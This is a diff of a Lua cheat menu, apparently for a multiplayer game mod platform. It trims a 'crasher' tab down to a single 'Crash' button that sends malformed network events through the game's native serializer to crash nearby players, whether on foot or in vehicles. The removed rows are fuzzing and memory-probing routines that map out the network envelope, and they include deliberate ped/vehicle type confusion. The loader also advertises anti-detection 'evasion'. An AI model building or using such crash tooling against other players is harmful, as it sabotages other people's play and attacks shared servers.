@@ -25426,7 +25426,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r22 (native serializer + self test)")
+    O.log("loader build 2026-10-29-r23 (crasher tab trimmed)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -32784,10 +32784,16 @@ local function installCrasher()
             end,
         },
         {
-            name = "Net crash",
+            -- Single entry point for the whole network layer. The fifteen
+            -- diagnostic rows are gone: they existed to find the envelope, and
+            -- the envelope is known now. This sends the crash candidates
+            -- through the game's own serializer, alternating between a target
+            -- on foot and a target in a vehicle.
+            name = "Crash",
             type = "action",
             onClick = function()
-                NET.crash()
+                NET.nativeMode = true
+                NET.sweep()
             end,
         },
         {
@@ -32796,192 +32802,6 @@ local function installCrasher()
             onClick = function()
                 C.crawlProbe()
             end,
-        },
-        {
-            name = "Net dump",
-            type = "action",
-            onClick = function()
-                NET.dumpEvents()
-            end,
-        },
-        {
-            name = "Net reg",
-            type = "action",
-            onClick = function()
-                NET.regDump()
-            end,
-        },
-        {
-            name = "Net dis",
-            type = "action",
-            onClick = function()
-                NET.disDump()
-            end,
-        },
-        {
-            name = "Net tbl",
-            type = "action",
-            onClick = function()
-                NET.tblCensus()
-            end,
-        },
-        {
-            name = "Net pack",
-            type = "action",
-            onClick = function()
-                local bytes = NET.bits({
-                    { bits = 64, val = { 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11 } },
-                    { bits = 32, val = 0x9ABCDEF0 },
-                    { bits = 32, val = 0 },
-                })
-                local hex = {}
-                for i = 1, #(bytes or {}) do
-                    hex[#hex + 1] = string.format("%02X", bytes[i])
-                end
-                O.log("net pack: %s", table.concat(hex))
-            end,
-        },
-        {
-            name = "Net ex",
-            type = "action",
-            onClick = function()
-                NET.rdumpRva("netex", 0x2A30250, 0x100)
-            end,
-        },
-        {
-            name = "Net ws",
-            type = "action",
-            onClick = function()
-                NET.rdumpRva("netws", 0x2A2BC60, 9 * 8)
-            end,
-        },
-        {
-            name = "Net code",
-            type = "action",
-            onClick = function()
-                NET.rdumpRva("netcode", 0x1000, 0x1000)
-            end,
-        },
-        {
-            name = "Ws type",
-            type = "action",
-            onClick = function()
-                NET.wsProbe = ((NET.wsProbe or -1) + 1) % 9
-                NET.wsSend(NET.wsProbe, 0x00, 48)
-            end,
-        },
-        {
-            name = "Ws fuzz",
-            type = "action",
-            onClick = function()
-                NET.wsProbe = ((NET.wsProbe or -1) + 1) % 9
-                NET.wsSend(NET.wsProbe, 0xFF, 48)
-            end,
-        },
-        {
-            name = "Net ptfx",
-            type = "action",
-            onClick = function()
-                NET.ptfxVar = ((NET.ptfxVar or -1) + 1) % 4
-                NET.ptfxProbe(NET.ptfxVar)
-            end,
-        },
-        {
-            name = "Net ev",
-            type = "action",
-            onClick = function()
-                local seq = { 61, 60, 66, 34, 53, 79, 78, 15, 35, 43 }
-                NET.evIdx = ((NET.evIdx or 0) % #seq) + 1
-                NET.evFill = (NET.evFill == 0xFF) and 0 or 0xFF
-                NET.evSend(seq[NET.evIdx], NET.evFill)
-            end,
-        },
-        {
-            -- Same four events with a leading field that actually resolves:
-            -- 66 wants a vehicle id, 15 wants a vehicle id, 27 wants a door
-            -- id. Two of the four deliberately hand a ped id to a vehicle
-            -- slot and the reverse, which is the only way to find out whether
-            -- the handler checks the object type before using it.
-            name = "Net ent",
-            type = "action",
-            onClick = function()
-                NET.entVar = ((NET.entVar or 0) % 4) + 1
-                local v = NET.entVar
-                local id = ({ 66, 66, 15, 27 })[v]
-                local kind = (v == 1 or v == 3) and "vehicle" or "ped"
-                local fill = (v <= 2) and 0xFF or 0x00
-                local nid, dist = NET.nearestNet(kind)
-                if not nid then
-                    O.log("net ent: no %s nearby", kind)
-                    return
-                end
-                O.log("net ent: v%d %s net id %d at %.1f m",
-                      v, kind, nid, tonumber(dist) or -1)
-                NET.evSend(id, fill, nid)
-            end,
-        },
-        {
-            -- The two bytes between the reply flag and the data length are the
-            -- one part of the envelope the serializer writes that nothing in
-            -- the DLL explains. Three candidates cover it: zero, our own
-            -- player id, and the all-ones sentinel. Same payload each time, so
-            -- a difference in outcome is attributable to those two bytes.
-            name = "Net tail",
-            type = "action",
-            onClick = function()
-                NET.tailVar = ((NET.tailVar or 0) % 3) + 1
-                local nid = NET.nearestNet("vehicle")
-                if not nid then O.log("net tail: no vehicle nearby"); return end
-                local sid = 0
-                local okS, v = pcall(GetPlayerServerId, PlayerId())
-                if okS and type(v) == "number" then sid = v end
-                local tail = ({ 0, sid, 0xFFFF })[NET.tailVar]
-                O.log("net tail: v%d tail16=%d veh %d", NET.tailVar, tail, nid)
-                NET.evSend(66, 0xFF, nid, tail)
-            end,
-        },
-        {
-            name = "Net mode",
-            type = "action",
-            onClick = function()
-                NET.nativeMode = not NET.nativeMode
-                O.log("net mode: %s", NET.nativeMode and "native serializer" or "packed envelope")
-            end,
-        },
-        {
-            name = "Net self",
-            type = "action",
-            onClick = function()
-                local okS, sid = pcall(GetPlayerServerId, PlayerId())
-                if not okS or type(sid) ~= "number" then
-                    O.log("net self: no local server id")
-                    return
-                end
-                -- Une liste qui ne contient que notre propre id : si le relais
-                -- renvoie l'evenement a son emetteur, l'effet est visible sans
-                -- second client, ce qui separe "le paquet n'arrive pas" de
-                -- "le paquet arrive mais la cible ne reagit pas".
-                for _, eid in ipairs({ 79, 34, 43 }) do
-                    local spec = NET.evBlob(eid, 0xFF)
-                    if spec then
-                        local data = NET.bits(spec)
-                        O.log("net self: id %d (%s) %d bytes -> [%d]",
-                              eid, NET.NAMES[eid] or "?", #data, sid)
-                        NET.emitEvent({ sid }, NET.EV[eid], eid, data)
-                        Citizen.Wait(400)
-                    end
-                end
-            end,
-        },
-        {
-            name = "Net kill",
-            type = "action",
-            onClick = function() NET.kill() end,
-        },
-        {
-            name = "Net sweep",
-            type = "action",
-            onClick = function() NET.sweep() end,
         },
     }
 
